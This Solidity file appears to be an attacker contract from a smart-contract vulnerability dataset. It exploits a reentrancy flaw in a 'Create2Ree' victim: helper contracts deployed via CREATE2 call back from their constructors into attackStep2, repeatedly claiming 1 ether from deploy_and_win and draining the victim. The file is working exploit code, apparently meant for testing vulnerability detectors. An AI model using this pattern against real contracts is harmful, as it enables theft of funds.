// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../dataset/cross-contract/create/Create2_ree1.sol";

contract Create2ReeAttacker {
    bytes private create_auxharmless_initcode;
    bytes private create_auxharmful_initcode;
    Create2Ree private victim;
    uint public stackCount;
    bool public flag;
    uint private salt = 8848;

    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
    constructor(address payable _victim) {
        victim = Create2Ree(_victim);
    }

    function attack() public payable {
        flag = true;
        while (flag) {
            // attack only every 10 instances, i.e. when some money is transfered
            if ((victim.getCounter(address(this)) + 1) % 10 == 0) {
                stackCount++;
                flag = false;
                bytes memory contractCode = abi.encodePacked(
                    type(Create2ReeAttackerAux2).creationCode,
                    abi.encode(address(this))
                );
                victim.deploy_and_win{value: 1 ether}(
                    contractCode,
                    payable(address(this)),
                    salt++
                );
            } else {
                victim.deploy_and_win{value: 1 ether}(
                    type(Create2ReeAttackerAux1).creationCode,
                    payable(address(this)),
                    salt++
                );
            }
        }
    }

    function attackStep2() public {
        if (address(victim).balance >= 1 ether && stackCount < 50) {
            stackCount++;
            bytes memory contractCode = abi.encodePacked(
                type(Create2ReeAttackerAux2).creationCode,
                abi.encode(address(this))
            );
            victim.deploy_and_win{value: 1 ether}(
                contractCode,
                payable(address(this)),
                salt++
            );
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract Create2ReeAttackerAux1 {
    constructor() {}
}

contract Create2ReeAttackerAux2 {
    constructor(address payable attacker) {
        Create2ReeAttacker(attacker).attackStep2();
    }
}
